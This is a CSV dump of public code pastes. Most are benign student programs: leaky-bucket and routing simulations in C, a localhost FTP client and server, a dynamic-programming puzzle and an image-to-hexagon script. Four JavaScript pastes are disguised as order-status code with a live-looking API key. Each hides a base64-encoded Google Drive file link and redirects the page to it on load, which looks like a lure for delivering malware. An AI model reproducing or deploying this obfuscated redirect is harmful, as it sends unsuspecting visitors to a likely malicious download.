id,title,username,language,date,content
fzPUjUs9,leaky_bucket,Bewin,C,Wednesday 9th of April 2025 11:32:24 PM CDT,"#include<stdio.h>
void main()
{
	int in,out,bsize,n,bucket=0;
	printf(""Enter the bucket size "");
	scanf(""%d"",&bsize);
	printf(""Enter the number of inputs "");
	scanf(""%d"",&n);
	printf(""Enter the packet outgoing rate "");
	scanf(""%d"",&out);
	while(n!=0)
	{
		printf(""\nEnter the incoming packet size "");
		scanf(""%d"",&in);
		if(in <= (bsize-bucket))
		{
		 	 bucket+=in;
		 	 printf(""\nBucket status : %d out of %d"", bucket, bsize);
		}
		else
		{
			printf(""\nDropped packets : %d \n"",in-(bsize-bucket));
			bucket=bsize;
			printf(""\nBucket status : %d out of %d"", bucket, bsize);
		}
		bucket=bucket-out;
		printf(""\nAfter outgoing, bucket status : %d out of %d"", bucket, bsize);
		n--;
	}
}
			"
Q9KdF0L3,DVR,Bewin,C,Wednesday 9th of April 2025 11:31:57 PM CDT,"#include<stdio.h>
struct node
{
    unsigned dist[20];
    unsigned from[20];
}rt[10];
int main()
{
    int costmat[20][20];
    int nodes,i,j,k,count=0;
    printf(""\nEnter the number of nodes : "");
    scanf(""%d"",&nodes);//Enter the nodes
    printf(""\nEnter the cost matrix :\n"");
    for(i=0;i<nodes;i++)
    {
        for(j=0;j<nodes;j++)
        {
            scanf(""%d"",&costmat[i][j]);
            costmat[i][i]=0;
            rt[i].dist[j]=costmat[i][j];//initialise the distance equal to cost matrix
            rt[i].from[j]=j;
        }
    }
        do
        {
            count=0;
            for(i=0;i<nodes;i++)
            	for(j=0;j<nodes;j++)
            		for(k=0;k<nodes;k++)
                		if(rt[i].dist[j]>costmat[i][k]+rt[k].dist[j])
                		{//We calculate the minimum distance
                   			 rt[i].dist[j]=rt[i].dist[k]+rt[k].dist[j];
                    			 rt[i].from[j]=k;
                   			 count++;
               		}
        }while(count!=0);
        for(i=0;i<nodes;i++)
        {
            printf(""\n\n Routing Table For Router %d\n"",i+1);
            for(j=0;j<nodes;j++)
            {
                printf(""\t\nnode %d via %d Distance %d "",j+1,rt[i].from[j]+1,rt[i].dist[j]);
            }
        }
    printf(""\n\n"");
  
}"
AZ4cRcgL,ftp_client,Bewin,C,Wednesday 9th of April 2025 11:31:29 PM CDT,"#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
int main(void)
{
    FILE *fp;
    int n,s;
    char name[100],rcvmsg[100],rcvg[100],fname[100];
    int socket_desc;
    struct sockaddr_in server_addr;
    
    
    // Create socket:
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    
    if(socket_desc < 0){
        printf(""Unable to create socket\n"");
        return -1;
    }
    
    printf(""Socket created successfully\n"");
    
    // Set port and IP the same as server-side:
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(2000);
    server_addr.sin_addr.s_addr = inet_addr(""127.0.0.1"");
    
    // Send connection request to server:
    if(connect(socket_desc, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
        printf(""Unable to connect\n"");
        return -1;
    }
    printf(""Connected with server successfully\n"");
    
    // Get input from the user:
    printf(""Enter filename "");
    scanf(""%s"",name);
    printf(""Enter the new file name\t"");
    scanf(""%s"",fname);
    fp=fopen(fname,""w"");
    send(socket_desc,name,sizeof(name),0);
    while(1){
             s=recv(socket_desc,rcvg,100,0);
             rcvg[s]='\0';
             if(strcmp(rcvg,""error"")==0)
             {
                 printf(""File is not available\n"");
                 exit(1);
             }
             if(strcmp(rcvg,""completed"")==0)
             {
                 printf(""File is transferred...\n"");
                 fclose(fp);
                 break;
             }
             else
             {
                 fputs(rcvg,stdout);
                 fprintf(fp,""%s"",rcvg);
                 
             }
    }
   
    // Close the socket:
    close(socket_desc);
    
    return 0;
}"
nEXkDQP3,ftp_server,Bewin,C,Wednesday 9th of April 2025 11:31:12 PM CDT,"#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    FILE *fp;
    char name[100],fileread[100],fname[100],ch,file[100],rcv[100];
    int n;
    int socket_desc, client_sock, client_size;
    struct sockaddr_in server_addr, client_addr;
      
       
    // Create socket:
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    
    if(socket_desc < 0){
        printf(""Error while creating socket\n"");
        return -1;
    }
    printf(""Socket created successfully\n"");
    
    // Set port and IP:
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(2000);
    server_addr.sin_addr.s_addr = inet_addr(""127.0.0.1"");
    
    // Bind to the set port and IP:
    if(bind(socket_desc, (struct sockaddr*)&server_addr, sizeof(server_addr))<0){
        printf(""Couldn't bind to the port\n"");
        return -1;
    }
    printf(""Done with binding\n"");
    
    // Listen for clients:
    if(listen(socket_desc, 1) < 0){
        printf(""Error while listening\n"");
        return -1;
    }
    printf(""\nListening for incoming connections.....\n"");
    
    // Accept an incoming connection:
    client_size = sizeof(client_addr);
    client_sock = accept(socket_desc, (struct sockaddr*)&client_addr, &client_size);
    
    if (client_sock < 0){
        printf(""Can't accept\n"");
        return -1;
    }
    //printf(""Client connected at IP: %s and port: %i\n"", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
    printf(""Connection accepted\n"");
    n=recv(client_sock,rcv,100,0);
    rcv[n]='\0';
    fp=fopen(rcv,""r"");
    if(fp==NULL)
    {
                send(client_sock,""error"",5,0);
                close(client_sock);
    }
    else
    {
        while(fgets(fileread,sizeof(fileread),fp))
        {
            if(send(client_sock,fileread,sizeof(fileread),0)<0)
            {
                printf(""Can't send file contents\n"");
            }
            sleep(1);
        }
        if(!fgets(fileread,sizeof(fileread),fp))
        {
            printf(""Done.."");
            send(client_sock,""completed"",9,0);
        }
    }
    
    // Closing the socket:
    close(client_sock);
    close(socket_desc);
    
    return 0;
}"
djLVsant,Market.js,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 11:19:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52118/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
A1t1EBzr,Untitled,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 11:03:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/85963/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rmM2sUmm,Products.js,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 10:48:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09236/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zPpRVsPi,Order.js,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 10:32:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34799/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6uY4A2PS,A20250408a_google_dp,Kali_prasad,Python,Wednesday 9th of April 2025 10:28:01 PM CDT,"'''
A20250408a_google_dp
assume you were given an n fences

you need to paint them with k colours

thing is no more then 2 fences have same color

find the number of ways to make this possible

---------------------------------------------------------------------------------------

important thing to be noted here is

this needs to be solved with dp states

assume you have matching btw i and i-1 treat this as dp 0 state for i
assume you have no matching btw i and i-1 treat this as dp 1 state for i

soo

dp[i][0] = dp[i-1][1] #the i-1 cannot be matched with i-2 so only 1st state of i-1 is choosen ,that's it when matching requires you need to choose 1st state of i-1
dp[i][1] = (k-1)*(dp[i-1][1] + dp[i-1][0])#now you do not care, whether i-1 matches with i-2 or not so taking both ways into consideration and multiplying those with left out paints count

k will be greater than 1

-----------------------------------------------------------------------------------------------------
inputs - n and k
3
2

outputs - 
6

'''

n = int(input())
k = int(input())
#we need 2 states here
#i must be matching with i-1 is 0 state
#i must not be matching with i-1 is 1 state
dp = [ [0,0] for _ in range(n)]
dp[0][0] = 0 #this is important ,there is no i-1 so you cannot match with i-1 color 
dp[0][1] = (k-1) + 1 #you dont care about i-1 ,which leaves you k-1 options ,but i-1 doesnt exist here so you can have total k as your choices here
for i in range(1,n):
    #if i need to match with i-1
    dp[i][0] = dp[i-1][1] #the exact number of i-1 dp state that is not matching with i-2
    #if i need not to match with i-1
    dp[i][1] = (dp[i-1][1]+dp[i-1][0]) * (k-1) #now you need not to care whether i-1 matches with i-2 or not ,you are considering both states of it

finalAnswer = (dp[n-1][0]+dp[n-1][1])
print(finalAnswer)


"
M8XxcQZi,Untitled,utahman3431,Python,Wednesday 9th of April 2025 10:22:17 PM CDT,"import numpy as np
from PIL import Image, ImageDraw, ImageFont
import os
import math

# Define the list of hex codes
colors = [
    ""#000000"", ""#808080"", ""#5C4033"", ""#A52A2A"", ""#D2B48C"",
    ""#FFE5B4"", ""#FF0000"", ""#FF5349"", ""#FFA500"", ""#FFFF00"",
    ""#9ACD32"", ""#008000"", ""#006400"", ""#00BCA1"", ""#ADD8E6"",
    ""#0000FF"", ""#FFC0CB"", ""#7F00FF"", ""#341539"", ""#FD3DB5""
]

# Define a function to convert a color to its closest approximation
def closest_color(color):
    min_distance = float(""inf"")
    closest_color_index = -1
    for i, c in enumerate(colors):
        c_rgb = tuple(int(c.lstrip(""#"")[i:i+2], 16) for i in (0, 2, 4))
        distance = np.sqrt(np.sum((np.array(color) - np.array(c_rgb)) ** 2))
        if distance < min_distance:
            min_distance = distance
            closest_color_index = i
    return closest_color_index

# Define a function to convert an image to a grid of interlocking hexagons
def image_to_hexagons(input_image_path, output_image_path, hexagon_size):
    image = Image.open(input_image_path)
    image = image.convert('RGB')  # Convert image to RGB mode
    pixels = image.load()
    width, height = image.size
    hexagon_width = int(width / (hexagon_size * 1.5))
    hexagon_height = int(height / (hexagon_size * math.sqrt(3) / 2))
    grid = np.zeros((hexagon_height, hexagon_width), dtype=int)

    for i in range(hexagon_height):
        for j in range(hexagon_width):
            hexagon_pixels = []
            for x in range(int(j * hexagon_size * 1.5), int((j + 1) * hexagon_size * 1.5)):
                for y in range(int(i * hexagon_size * math.sqrt(3) / 2), int((i + 1) * hexagon_size * math.sqrt(3) / 2)):
                    if x < width and y < height:
                        hexagon_pixels.append(pixels[x, y])
            if hexagon_pixels:
                avg_color = tuple(int(np.mean([pixel[k] for pixel in hexagon_pixels])) for k in range(3))
                grid[i, j] = closest_color(avg_color)

    # Create a new image with the hexagon pattern
    hexagon_image = Image.new(""RGB"", (int(hexagon_width * hexagon_size * 1.5), int(hexagon_height * hexagon_size * math.sqrt(3) / 2)), (255, 255, 255))
    draw = ImageDraw.Draw(hexagon_image)
    font = ImageFont.load_default()
    for i in range(hexagon_height):
        for j in range(hexagon_width):
            points = []
            for k in range(6):
                angle = k * math.pi / 3
                x = int(j * hexagon_size * 1.5 + hexagon_size * math.cos(angle))
                y = int(i * hexagon_size * math.sqrt(3) / 2 + hexagon_size * math.sin(angle))
                points.append((x, y))
            draw.polygon(points, outline=(0, 0, 0), width=1)
            text = str(grid[i, j])
            text_width, text_height = font.getmask(text).size
            x = int(j * hexagon_size * 1.5 + hexagon_size / 2 - text_width / 2)
            y = int(i * hexagon_size * math.sqrt(3) / 2 + hexagon_size / 2 - text_height / 2)
            draw.text((x, y), text, fill=(0, 0, 0), font=font)

    # Create a new folder for the output
    output_folder = output_image_path
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Save the hexagon image
    hexagon_image.save(os.path.join(output_folder, ""hexagons.png""))

    # Create a new image with the colored hexagon pattern
    colored_image = Image.new(""RGB"", (int(hexagon_width * hexagon_size * 1.5), int(hexagon_height * hexagon_size * math.sqrt(3) / 2)), (255, 255, 255))
    draw = ImageDraw.Draw(colored_image)
    for i in range(hexagon_height):
        for j in range(hexagon_width):
            points = []
            for k in range(6):
                angle = k * math.pi / 3
                x = int(j * hexagon_size * 1.5 + hexagon_size * math.cos(angle))
                y = int(i * hexagon_size * math.sqrt(3) / 2 + hexagon_size * math.sin(angle))
                points.append((x, y))
            color_index = grid[i, j]
            color = tuple(int(colors[color_index].lstrip(""#"")[i:i+2], 16) for i in (0, 2, 4))
            draw.polygon(points, fill=color, outline=(0, 0, 0), width=1)

    # Save the colored image
    colored_image.save(os.path.join(output_folder, ""colored.png""))

# Get user input
input_image_path = input(""Enter the name of the input image: "")
output_image_path = input(""Enter the name for the output image: "")
hexagon_size = int(input(""Enter the size of the hexagons: ""))

# Call the function
image_to_hexagons(input_image_path, output_image_path, hexagon_size)"
